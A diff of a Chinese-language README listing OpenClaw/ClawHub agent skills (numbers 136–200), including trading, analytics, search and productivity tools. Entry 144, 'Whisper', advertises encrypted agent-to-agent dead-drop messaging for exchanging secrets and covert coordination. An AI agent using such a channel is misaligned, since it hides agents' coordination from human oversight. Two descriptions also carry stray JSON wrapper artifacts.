+<td><a href="https://clawdhub.com/skills/habit-tracker">ClawHub/habit-tracker</a></td>
+<td>结合打卡、提醒与进度可视化养成习惯</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>garmin健康分析</td>
+<td>Garmin Health Analysis 🔑</td>
+<td><a href="https://clawdhub.com/skills/garmin-health-analysis">ClawHub/garmin-health-analysis</a></td>
+<td>自然对话查询 Garmin 数据——如“我滑雪最快速度是多少？”、“昨晚睡得如何？”、“下午3点心率多少？”。访问睡眠分期、身体电量、HRV、最大摄氧量、训练准备程度、身体成分、血氧饱和度等20多项指标，下载 FIT/GPX 文件分析路线，查询任意点的海拔或配速，生成交互式健康仪表盘。从随意的“展示本周运动”到深度的“分析我的恢复与训练负荷对比”，应有尽有。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>每周报告生成器</td>
+<td>Weekly Report Generator</td>
+<td><a href="https://clawdhub.com/skills/weekly-report-generator">ClawHub/weekly-report-generator</a></td>
+<td>自动生成结构化每周业务报告，涵盖关键绩效指标、成就、阻碍因素和计划，每周节省数小时报告时间。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>moltrade</td>
+<td>moltrade 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltrade">ClawHub/moltrade</a></td>
+<td>在OpenClaw中操作Moltrade交易机器人（配置、回测、测试模式运行、Nostr信号广播、交易所适配器、策略集成）</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>金融radar</td>
+<td>Finance Radar 🔑</td>
+<td><a href="https://clawdhub.com/skills/finance-radar">ClawHub/finance-radar</a></td>
+<td>基于雅虎财经数据的股票和加密货币分析。适用于用户需要：(1) 分析股票或加密货币的价格/基本面，(2) 追踪投资...</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>product管理器toolkit</td>
+<td>Product Manager Toolkit</td>
+<td><a href="https://clawdhub.com/skills/product-manager-toolkit">ClawHub/product-manager-toolkit</a></td>
+<td>产品经理综合工具包，涵盖RICE优先级排序、客户访谈分析、PRD模板、探索框架及上市策略...</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>Amazon Competitor Analyzer</td>
+<td>Amazon Competitor Analyzer 🔑</td>
+<td><a href="https://clawdhub.com/skills/amazon-competitor-analyzer">ClawHub/amazon-competitor-analyzer</a></td>
+<td>利用 browseract.com 自动化 API 根据 ASIN 抓取亚马逊产品数据，并进行精准竞品分析，对比规格、价格、评论等信息。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>TaskrPersistent任务规划&amp;ExecutionforAI代理</td>
+<td>Taskr - Persistent Task Planning &amp; Execution for AI Agents 🔑</td>
+<td><a href="https://clawdhub.com/skills/taskr">ClawHub/taskr</a></td>
+<td>OpenClaw 持久云任务规划与执行。创建层级任务计划，可在会话重置后保留，跨多个代理运行，并让用户重新...</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>Memos</td>
+<td>Memos 🔑</td>
+<td><a href="https://clawdhub.com/skills/memos">ClawHub/memos</a></td>
+<td>通过 Memos API 管理备忘录：支持创建、获取、删除及列表展示，包含可见性和分页功能，需配置 MEMOS_URL 和 MEMOS_TOKEN。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>Whisper</td>
+<td>whisper</td>
+<td><a href="https://clawdhub.com/skills/whisper">ClawHub/whisper</a></td>
+<td>通过Moltbook死信箱进行端到端加密的代理间私密通信。适用于代理需私下沟通、交换机密或隐蔽协同的场景。</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>computervision专家</td>
+<td>Computer Vision Expert</td>
+<td><a href="https://clawdhub.com/skills/computer-vision-expert">ClawHub/computer-vision-expert</a></td>
+<td>2026年最前沿的计算机视觉专家，精通YOLO26、分割一切3（SAM 3）、视觉语言模型以及实时空间分析。</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>股票copilot专业版</td>
+<td>Stock Copilot Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/stock-copilot-pro">ClawHub/stock-copilot-pro</a></td>
+<td>OpenClaw 股票分析技能，适用于美国/香港/中国A股市场，整合 QVeris 数据源（THS、Caidazi、Alpha Vantage、Finnhub、X 情感）提供行情、基本面等数据。</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>finnhub专业版</td>
+<td>Finnhub Pro 🔑</td>
+<td><a href="https://clawdhub.com/skills/finnhub-pro">ClawHub/finnhub-pro</a></td>
+<td>Finnhub 美股金融数据 CLI。实时报价、公司档案、新闻、分析师推荐、内部人交易、盈利日历、基本面财务、同行比较。Python 脚本封装，免费层 60 次/分钟。Use when: 查股价、查公司信息、看最新新闻、了解内部人是否在买卖、查看近期财报日期。NOT for: K线数据、目标价、情绪分析（需付费层）。</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>Decision Trees</td>
+<td>Decision Trees</td>
+<td><a href="https://clawdhub.com/skills/decision-trees">ClawHub/decision-trees</a></td>
+<td>用于各领域复杂决策的决策树分析。当用户需评估不确定结果的多种选项、分析风险回报或系统化构建选择时使用。适用于商业、投资、个人决策、运营、职业选择及产品策略等。触发词包括决策树、我是否该、如果...会怎样、评估选项、比较方案、风险分析。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>数据模型designer</td>
+<td>Data Model Designer</td>
+<td><a href="https://clawdhub.com/skills/data-model-designer">ClawHub/data-model-designer</a></td>
+<td>为建筑项目设计数据模型，创建实体关系图，定义模式，生成数据库结构。</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>Bitwarden</td>
+<td>Bitwarden</td>
+<td><a href="https://clawdhub.com/skills/bitwarden">ClawHub/bitwarden</a></td>
+<td>使用 rbw CLI 安全访问和管理 Bitwarden/Vaultwarden 密码</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>Polymarket Arbitrage</td>
+<td>Polymarket Arbitrage</td>
+<td><a href="https://clawdhub.com/skills/polymarket-arbitrage">ClawHub/polymarket-arbitrage</a></td>
+<td>监控Polymarket预测市场套利机会，检测数学套利（多结果概率不匹配）、跨市场套利（同一事件不同价格）和订单簿低效。用于寻找或交易Polymarket套利、监控预测市场机会及实施自动化交易策略。包含风险管理、盈亏跟踪和警报功能。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>business开发</td>
+<td>Business Development</td>
+<td><a href="https://clawdhub.com/skills/business-development">ClawHub/business-development</a></td>
+<td>合作伙伴拓展、市场调研、竞品分析与方案生成。将AI智能体转变为战略业务发展伙伴，识别并培育增长机会。</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>交易研究</td>
+<td>Trading Research</td>
+<td><a href="https://clawdhub.com/skills/trading-research">ClawHub/trading-research</a></td>
+<td>币安加密货币交易研究、技术分析与仓位管理。针对加密货币价格、市场数据、交易分析、定投计划、仓位计算、巨鲸动向，以及关于比特币、山寨币或加密货币市场的交易研究咨询进行响应。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>Cloudbase</td>
+<td>Cloudbase</td>
+<td><a href="https://clawdhub.com/skills/cloudbase">ClawHub/cloudbase</a></td>
+<td>在开发、设计、构建、部署、调试、迁移或排查 CloudBase（腾讯云开发、云开发、TCB、微信云开发）项目时使用本技能，适用于 Web 应用（React、...）</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>AI数据分析</td>
+<td>AI Data Analysis</td>
+<td><a href="https://clawdhub.com/skills/ai-data-analysis">ClawHub/ai-data-analysis</a></td>
+<td>自动化进行CSV/Excel数据清洗、统计分析、趋势检测、异常识别、可视化及报告生成。</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>飞书集成</td>
+<td>Lark Integration 🔑</td>
+<td><a href="https://clawdhub.com/skills/lark-integration">ClawHub/lark-integration</a></td>
+<td>通过 webhook 桥接将 Lark（飞书）消息与 OpenClaw 双向连通，支持文本、富文本（post）和图片消息的发送与接收。适用于将 Lark/飞书设为消息渠道、接收含图片的消息、向 Lark 回复、读取 Lark 文档/知识库/多维表格，或排查 Lark 集成问题。兼容 Lark 国际版（larksuite.com）和国内飞书（feishu.cn）。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>代理evaluation</td>
+<td>Agent Evaluation</td>
+<td><a href="https://clawdhub.com/skills/agent-evaluation">ClawHub/agent-evaluation</a></td>
+<td>{&quot;answer&quot;:&quot;LLM智能体测试与基准评测，涵盖行为测试、能力评估、可靠性指标及生产监控——即便是顶尖智能体在真实基准测试中通过率也不到50%。适用场景：智能体测试、智能体评估、智能体基准、智能体可靠性、测试智能体。&quot;}</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>TikTok Crawling (yt-dlp)</td>
+<td>TikTok Crawling (yt-dlp)</td>
+<td><a href="https://clawdhub.com/skills/tiktok-crawling">ClawHub/tiktok-crawling</a></td>
+<td>用于 TikTok 爬取、内容检索与分析</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>交易signalttx</td>
+<td>Trade Signal</td>
+<td><a href="https://clawdhub.com/skills/trade-signal-ttx">ClawHub/trade-signal-ttx</a></td>
+<td>实时交易信号，提供可执行的买入/卖出/持有建议，用于股票交易决策、技术分析、买卖提示、财报行情、目标价、分析师评级、入场/出场点位、投资组合再平衡等。支持美国、全球、亚洲新兴市场、个股、ETF及期权策略。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>研究引擎</td>
+<td>Research-engine</td>
+<td><a href="https://clawdhub.com/skills/research-engine">ClawHub/research-engine</a></td>
+<td>自动化多源信息收集与趋势分析，生成结构化研究报告并制定阶段性开发计划，助力技术探索与规划。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>社交sentiment</td>
+<td>Social Sentiment 🔑</td>
+<td><a href="https://clawdhub.com/skills/social-sentiment">ClawHub/social-sentiment</a></td>
+<td>针对Twitter、Reddit和Instagram的品牌与产品情感分析。监控舆情，追踪品牌声誉，检测公关危机，大规模提取投诉与赞扬——支持分析超7万条帖子，提供批量CSV导出与Python/pandas处理。基于超15亿条索引帖子驱动的社交聆听与品牌监控工具。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>Wisdom &amp; Accountability Coach</td>
+<td>Wisdom &amp; Accountability Coach</td>
+<td><a href="https://clawdhub.com/skills/wisdom-accountability-coach">ClawHub/wisdom-accountability-coach</a></td>
+<td>长期记忆追踪、哲学教学、同情心驱动的个人责任。精通模式识别、斯多葛/佛教、成长指导。</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>get-tldr</td>
+<td>get-tldr 🔑</td>
+<td><a href="https://clawdhub.com/skills/get-tldr">ClawHub/get-tldr</a></td>
+<td>提供 get-tldr.com 汇总 API 返回的摘要，无需进一步汇总；该技能应格式化 API 输出以提高可读性，但不得更改其内容。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>SWOT Analyzer</td>
+<td>SWOT Analyzer</td>
+<td><a href="https://clawdhub.com/skills/afrexai-swot-analyzer">ClawHub/afrexai-swot-analyzer</a></td>
+<td>通过评估优势、劣势、机会、威胁及战略建议，为企业或产品进行详细的SWOT分析。</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>抖音视频analyst</td>
+<td>Douyin Video Analyst 🔑</td>
+<td><a href="https://clawdhub.com/skills/douyin-video-analyst">ClawHub/douyin-video-analyst</a></td>
+<td>抖音账号视频批量采集与文案分析工作流。当用户提供抖音账号主页链接、要求抓取最新 N 条视频链接、提取视频文案（语音转文字）、或对视频内容进行总结归纳时，激活此 skill。依赖 browser 工具（抓取视频列表）和 mcporter + douyin-mcp（文案提取）。</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>数据analystcn</td>
+<td>Data Analyst Cn</td>
+<td><a href="https://clawdhub.com/skills/data-analyst-cn">ClawHub/data-analyst-cn</a></td>
+<td>数据分析助手 - 数据清洗、统计分析、可视化建议。适合：数据分析师、产品经理、运营。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>LegalDocAI</td>
+<td>LegalDoc AI 🔑</td>
+<td><a href="https://clawdhub.com/skills/legaldoc-ai">ClawHub/legaldoc-ai</a></td>
+<td>为律所及专业人士自动执行合同与法律文件的提取、分析、摘要、检索及期限跟踪。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>发票生成器</td>
+<td>Invoice Generator</td>
+<td><a href="https://clawdhub.com/skills/invoice-generator">ClawHub/invoice-generator</a></td>
+<td>从JSON数据生成专业PDF发票。适用于需要创建包含公司与客户信息及明细项的发票、账单或付款请求的场景。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>competitive分析</td>
+<td>Competitive Analysis</td>
+<td><a href="https://clawdhub.com/skills/competitive-analysis">ClawHub/competitive-analysis</a></td>
+<td>对独立创业者业务进行深度竞争分析。适用于详细绘制竞争对手、发现可利用空白、理解竞争对手策略、对比自身产品或决定如何在市场中定位。比市场研究中的宏观概览更深入，专注于对特定竞争对手的细致剖析。触发关键词：“分析我的竞争对手”“竞争分析”“我的竞争对手是谁”“竞争对手深度分析”“如何击败竞争”“竞争格局”“与竞争对手对标”。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>投资组合管理器</td>
+<td>Portfolio Manager 🔑</td>
+<td><a href="https://clawdhub.com/skills/portfolio-manager">ClawHub/portfolio-manager</a></td>
+<td>使用Alpaca MCP服务器集成获取持仓和仓位信息，进行全面的投资组合分析，包括资产配置、风险指标、个股仓位、多样化程度分析，并生成再平衡建议。适用于用户请求投资组合审查、仓位分析、风险评估、业绩评估或证券账户再平衡建议的场景。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>duckdbCLIAI技能</td>
+<td>DuckDB CLI skills</td>
+<td><a href="https://clawdhub.com/skills/duckdb-cli-ai-skills">ClawHub/duckdb-cli-ai-skills</a></td>
+<td>DuckDB CLI 专家，专注于 SQL 分析、数据处理和文件转换。适用于 SQL 查询、CSV/Parquet/JSON 分析、数据库查询或数据转换。触发词：duckdb、sql、query、data analysis、parquet、convert data。</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>代理管理器</td>
+<td>Agent manager</td>
+<td><a href="https://clawdhub.com/skills/agents-manager">ClawHub/agents-manager</a></td>
+<td>管理Clawdbot代理：发现、画像、跟踪能力，定义路由层级并分配任务。适用场景：（1）列出可用代理；（2）画像代理能力与通信方式；（3）定义代理路由（can_assign_to, reports_to, escalation_path）；（4）分配任务至合适代理；（5）跟踪代理绩效与已完成工作；（6）变更后更新代理注册表。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>perplexity深度搜索</td>
+<td>Perplexity Deep Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/perplexity-deep-search">ClawHub/perplexity-deep-search</a></td>
+<td>通过 Perplexity API 进行深度搜索。提供三种模式：搜索（快速事实）、推理（复杂分析）、研究（深度报告）。返回基于 AI 且有据可依的答案。</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>营销</td>
+<td>Marketing</td>
+<td><a href="https://clawdhub.com/skills/marketing">ClawHub/marketing</a></td>
+<td>社交媒体自动化、内容排期、数据分析与营销管理。将AI代理打造为跨平台内容策略的营销引擎。</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>深度thinking</td>
+<td>Deep Thinking</td>
+<td><a href="https://clawdhub.com/skills/deep-thinking">ClawHub/deep-thinking</a></td>
+<td>引导系统透彻思考的综合深度推理框架，自动应用于多步骤、模糊等复杂任务...</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>MySQL</td>
+<td>MySQL</td>
+<td><a href="https://clawdhub.com/skills/mysql">ClawHub/mysql</a></td>
+<td>编写正确的MySQL查询，避免字符集、索引和锁方面的常见陷阱。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>polymarket交易员</td>
+<td>Polymarket Trader</td>
+<td><a href="https://clawdhub.com/skills/polymarket-trader">ClawHub/polymarket-trader</a></td>
+<td>构建并分析基于币安BTCUSDT的BTC 1小时多空策略，应用优势阈值、行情过滤及详细交易验证。</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>表格cog</td>
+<td>sheet-cog</td>
+<td><a href="https://clawdhub.com/skills/sheet-cog">ClawHub/sheet-cog</a></td>
+<td>CellCog 由其自研编程智能体打造，该智能体同样为您构建电子表格。它提供完整 Python 访问权限，支持复杂数据处理、公式、数据透视表、财务模型、预算模板、数据追踪、预测及 Excel/XLSX 生成——依托于每日迭代整个 AI 平台的工程大脑。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>B站YouTubewatcher</td>
+<td>Bilibili &amp; YouTube Watcher</td>
+<td><a href="https://clawdhub.com/skills/bilibili-youtube-watcher">ClawHub/bilibili-youtube-watcher</a></td>
+<td>获取并读取YouTube和Bilibili视频的字幕。用于总结视频、回答视频相关问题或提取信息。</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>Notion同步</td>
+<td>Notion Sync 🔑</td>
+<td><a href="https://clawdhub.com/skills/notion-sync">ClawHub/notion-sync</a></td>
+<td>双向同步与管理 Notion 页面和数据库，适用于 Notion 工作空间中的协作编辑、科研追踪、项目管理。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>新闻aggregator技能2</td>
+<td>News Aggregator Skill</td>
+<td><a href="https://clawdhub.com/skills/news-aggregator-skill-2">ClawHub/news-aggregator-skill-2</a></td>
+<td>{&quot;answer&quot;:&quot;聚合 Hacker News、GitHub Trending、Product Hunt、36Kr、腾讯新闻、华尔街见闻、V2EX 及微博等 8 大来源的实时内容，提供抓取、过滤与深度分析。最适合“每日速览”、“科技简报”、“财经动态”及热点“深度解读”。&quot;}</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>OnchainCLI</td>
+<td>Onchain CLI 🔑</td>
+<td><a href="https://clawdhub.com/skills/onchain">ClawHub/onchain</a></td>
+<td>加密货币投资组合跟踪、行情数据、CEX历史及交易查询的命令行工具。适用于查询加密货币价格、钱包余额、投资组合价值、Coinbase/Binance持仓、Polymarket预测或交易详情。</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>synth数据</td>
+<td>Synth Data 🔑</td>
+<td><a href="https://clawdhub.com/skills/synth-data">ClawHub/synth-data</a></td>
+<td>从Synthdata.co查询加密货币、大宗商品及股票的波动率预测，比较资产并运行蒙特卡洛模拟。</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>triple记忆</td>
+<td>Triple Memory 🔑</td>
+<td><a href="https://clawdhub.com/skills/triple-memory">ClawHub/triple-memory</a></td>
+<td>结合 LanceDB 自动召回、Git-Notes 结构化记忆和基于文件的工作区搜索的完整记忆系统。适用于建立全面的智能体记忆、需要跨会话持久化上下文或管理决策/偏好/任务等多记忆后端协同工作的场景。</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>MinimaxExcel</td>
+<td>Minimax Xlsx</td>
+<td><a href="https://clawdhub.com/skills/minimax-xlsx">ClawHub/minimax-xlsx</a></td>
+<td>MiniMax电子表格制作系统。适用于涉及表格数据、数值分析或电子表格生成的任务，支持XLSX/XLSM/CSV等格式。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>投资助理</td>
+<td>ETF投资助理</td>
+<td><a href="https://clawdhub.com/skills/etf-assistant">ClawHub/etf-assistant</a></td>
+<td>ETF投资助理 / ETF Investment Assistant - 查询行情、筛选ETF、对比分析、定投计算。支持沪深300、创业板、科创50、纳指等主流ETF。</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>institutional流程追踪器</td>
+<td>Institutional Flow Tracker 🔑</td>
+<td><a href="https://clawdhub.com/skills/institutional-flow-tracker">ClawHub/institutional-flow-tracker</a></td>
+<td>使用此技能跟踪机构投资者持仓变化及投资组合流向，基于13F文件数据。分析对冲基金、共同基金及其他机构持股，识别聪明钱大量买入或卖出的股票。通过追踪专业投资者的资金部署方向，发现重大行情前的潜力股。</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>市场sentimentpulse</td>
+<td>Market Sentiment Pulse</td>
+<td><a href="https://clawdhub.com/skills/market-sentiment-pulse">ClawHub/market-sentiment-pulse</a></td>
+<td>扫描新闻和社交信号，汇总并分析特定加密货币或股票代码的市场情绪，适用于交易前的快速市场氛围研判。</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>视频编辑</td>
+<td>Video Editing</td>
+<td><a href="https://clawdhub.com/skills/video-edit">ClawHub/video-edit</a></td>
+<td>利用AI背景移除、调色、超分辨率、防抖及增强工具编辑视频。</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>OpenClaw仪表盘</td>
+<td>openclaw-dashboard</td>
+<td><a href="https://clawdhub.com/skills/openclaw-dashboard">ClawHub/openclaw-dashboard</a></td>
+<td>OpenClaw实时运维仪表盘，监控会话、成本、定时任务及网关健康状态。用于安装、启动等服务操作。</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>每日briefing</td>
+<td>Daily Briefing</td>
+<td><a href="https://clawdhub.com/skills/daily-briefing">ClawHub/daily-briefing</a></td>
+<td>生成包含天气、日程、提醒、生日及重要邮件的温暖精简每日简报，适用于定时任务或聊天推送。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>股票study</td>
+<td>Stock Study</td>
+<td><a href="https://clawdhub.com/skills/stock-study">ClawHub/stock-study</a></td>
+<td>针对个股的高级股票研究分析。当用户请求详细股票分析（包括公司概况、华尔街共识等）时使用。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>binancespot交易员</td>
+<td>Binance Spot Trader 🔑</td>
+<td><a href="https://clawdhub.com/skills/binance-spot-trader">ClawHub/binance-spot-trader</a></td>
+<td>自主的币安现货交易机器人，采用LLM进行市场分析。支持动量交易、均值回归和定投（DCA）策略，适用于任何币安现货交易对。在用户希望进行币安交易、建立自动加密交易或设置自动定投买入时使用。功能包括技术分析、LLM情绪评估、仓位管理和投资组合跟踪。</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>odooOpenClaw技能</td>
+<td>Odoo Reporting 🔑</td>
+<td><a href="https://clawdhub.com/skills/odoo-openclaw-skill">ClawHub/odoo-openclaw-skill</a></td>
+<td>查询 Odoo 数据，包括销售人员业绩、客户分析、订单、发票、CRM、会计、增值税、库存及应收/应付，并生成 WhatsApp 卡片...</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>本地RAG搜索</td>
+<td>Local Rag Search</td>
+<td><a href="https://clawdhub.com/skills/local-rag-search">ClawHub/local-rag-search</a></td>
+<td>使用 mcp-local-rag 服务器执行高效的网络搜索，支持语义相似度排序。当需要搜索最新信息、研究跨多个来源的主题或收集互联网上下文（无需外部 API）时使用此技能。教授有效使用基于 RAG 的网络搜索，涵盖 DuckDuckGo、Google 及多引擎深度研究功能。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>gitai技能</td>
+<td>Gitai - Git Commit Automation</td>
+<td><a href="https://clawdhub.com/skills/gitai-skill">ClawHub/gitai-skill</a></td>
+<td>提升开发者生产力，Gitai：AI 驱动的 Git 自动化工具，即时分析代码变更并生成语义化 Conventional Commits。支持 Node.js、Python、Java、Go、PHP 等语言。兼容 OpenAI、Anthropic 与 Groq。</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>zhipu网页搜索</td>
+<td>zhipu web search 🔑</td>
+<td><a href="https://clawdhub.com/skills/zhipu-web-search">ClawHub/zhipu-web-search</a></td>
+<td>智谱AI网络搜索工具——通过cURL提供灵活的搜索引擎功能。适用场景：需要搜索网络信息获取最新数据时。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>A Clawdbot skill that gives your agent native access to DWLF — a market analysis platform for crypto and stocks.</td>
+<td>A Clawdbot skill that gives your agent native access to DWLF — a market analysis platform for crypto and stocks. 🔑</td>
+<td><a href="https://clawdhub.com/skills/dwlf">ClawHub/dwlf</a></td>
+<td>与加密货币和股票市场分析平台 DWLF (dwlf.co.uk) 交互。功能涵盖：市场数据、价格图表、技术指标（EMA、RSI、DSS、支撑/阻力、趋势线、K线形态、SMC）、策略（可视化信号构建器）、回测、自定义事件、交易信号、投资组合追踪、自选列表、交易日记、图表标注、交易计划、仓位管理及学院内容。触发词包括：市场分析、交易信号、回测、投资组合、DWLF、图表指标、支撑/阻力、策略构建器...</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>moochmaniactavily搜索</td>
+<td>Tavily Web Search 🔑</td>
+<td><a href="https://clawdhub.com/skills/moochmaniac-tavily-search">ClawHub/moochmaniac-tavily-search</a></td>
+<td>使用Tavily API进行针对AI智能体优化的实时网络搜索。适用于需要获取最新资讯、近期新闻、事实调研、竞品分析等场景。</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>GA4分析</td>
+<td>GA4 Analytics 🔑</td>
+<td><a href="https://clawdhub.com/skills/ga4">ClawHub/ga4</a></td>
+<td>通过 Analytics Data API 查询 Google Analytics 4 (GA4) 数据。适用于获取热门页面、流量来源、用户数、会话数等网站分析数据。</td>
+</tr>
+</tbody>
+</table>
 
-### 🗄️ 数据库管理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 数据库 | [Clawdbot/database](https://clawdhub.com/skills/database) | 数据库管理和查询。连接到 SQL 和 NoSQL 数据库、运行查询并管理架构。 |
-| Redis | [Clawdbot/redis](https://clawdhub.com/skills/redis) | Redis数据库管理。键值操作、缓存、发布/订阅和数据结构命令。 |
-| Redis 生成器 | [Clawdbot/redis-gen](https://clawdhub.com/skills/redis-gen) | 生成 Redis 关键模式和数据结构设计。在规划 Redis 架构时使用。 |
-| Redis Schema 生成器 | [Clawdbot/redis-schema-gen](https://clawdhub.com/skills/redis-schema-gen) | 生成 Redis 密钥模式和数据结构。设计 Redis 架构时使用。 |
-| Schema Writer | [Clawdbot/schema-writer](https://clawdhub.com/skills/schema-writer) | 从简单的英语生成数据库模式。当您需要快速 SQL 表时使用。 |
-| Seed Gen | [Clawdbot/seed-gen](https://clawdhub.com/skills/seed-gen) | 从您的模式生成真实的数据库种子数据。当您需要看起来真实的测试数据时使用。 |
-| SQL Writer | [Clawdbot/sql-writer](https://clawdhub.com/skills/sql-writer) | 将自然语言转换为 SQL 查询。当您需要快速编写 SQL 时使用。 |
-| TMDb | [Clawdbot/tmdb](https://clawdhub.com/skills/tmdb) | 通过 TMDb API 搜索电影/电视、获取演员阵容、收视率、流媒体信息和个性化推荐。 |
+---
 
-### ☁️ 云平台管理
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Jira | [Clawdbot/clawdbot-jira-skill](https://clawdhub.com/skills/clawdbot-jira-skill) | 通过 Jira Cloud REST API 管理 Jira 问题、转换和工作日志。 |
-| Microsoft 365 集成 | [Clawdbot/ms365](https://clawdhub.com/skills/ms365) | （无） |
-| Oura Ring | [Clawdbot/oura-ring-skill](https://clawdhub.com/skills/oura-ring-skill) | 通过 Oura Cloud API V2 获取 Oura Ring 准备情况/睡眠 + 7 天准备情况趋势，并生成晨间准备情况简报。 |
+<a id="cat-content-creation"></a>
 
-### 📈 监控与日志
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Devialet 扬声器 | [Clawdbot/devialet](https://clawdhub.com/skills/devialet) | 通过 HTTP API 控制 Devial​​et Phantom 扬声器。用于：播放/暂停、音量控制、静音/取消静音、源选择和扬声器状态。需要 DOS 2.14+ 固件。适用于 Phantom I、Phantom II、Phantom Reactor 和 Dialog。 |
-| Ecto Ghost | [Clawdbot/ecto](https://clawdhub.com/skills/ecto) | Ghost.io Admin API CLI 用于管理博客文章、页面、标签和内容。 |
-| Fizzy | [Clawdbot/fizzy](https://clawdhub.com/skills/fizzy) | 管理 Fizzy 板、卡片、步骤、评论和反应。当用户询问看板、卡片、任务、待办事项或任何 Fizzy 内容时使用。 |
-| Healthy Eating | [Clawdbot/healthy-eating](https://clawdhub.com/skills/healthy-eating) | 通过膳食记录、营养跟踪和食物选择建立健康的饮食习惯 |
-| Huckleberry | [Clawdbot/huckleberry](https://clawdhub.com/skills/huckleberry) | 通过 Huckleberry CLI 跟踪婴儿睡眠、喂养、尿布和生长情况。当用户询问记录婴儿活动、开始/停止睡眠、奶瓶喂养、换尿布或生长测量时使用。 |
-| Logger 生成器 | [Clawdbot/logger-gen](https://clawdhub.com/skills/logger-gen) | 为任何框架设置结构化日志记录。配置日志记录时使用。 |
-| Self Love Confidence | [Clawdbot/self-love-confidence](https://clawdhub.com/skills/self-love-confidence) | 通过肯定、胜利记录和内部批评管理来建立自爱和自信 |
-| ServiceNow Agent | [Clawdbot/servicenow-agent](https://clawdhub.com/skills/servicenow-agent) | 对 ServiceNow 表、附件、聚合和服务目录 API 的只读 CLI 访问；包括模式检查和历史检索（只读）。 |
-| Stress Relief | [Clawdbot/stress-relief](https://clawdhub.com/skills/stress-relief) | 通过快速技巧、压力记录和恢复工具来管理压力 |
+## 5、✍️ 内容创作
 
-### 🔌 API与集成
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| Alchemy Pay 支付网关 | [Clawdbot/alchemy-pay](https://clawdhub.com/skills/alchemy-pay) | Alchemy Pay (ACH) 法币到加密货币支付网关集成。入口匝道、出口匝道、商户支付和 NFT 结账服务。 |
-| Apollo.io | [Clawdbot/apollo](https://clawdhub.com/skills/apollo) | 与 Apollo.io REST API 交互（人员/组织充实、搜索、列表）。 |
-| beepctl | [Clawdbot/beepctl](https://clawdhub.com/skills/beepctl) | 通过 Beeper Desktop API 发送消息、搜索聊天或管理跨消息传递平台（Telegram、WhatsApp、Slack、iMessage 等）的对话时使用。 |
-| Beestat | [Clawdbot/beestat](https://clawdhub.com/skills/beestat) | 通过 Beestat API 查询 ecobee 恒温器数据，包括温度、湿度、空气质量（CO2、VOC）、传感器和 HVAC 运行时间。当用户询问家庭温度、恒温器状态、空气质量或供暖/制冷使用情况时使用。 |
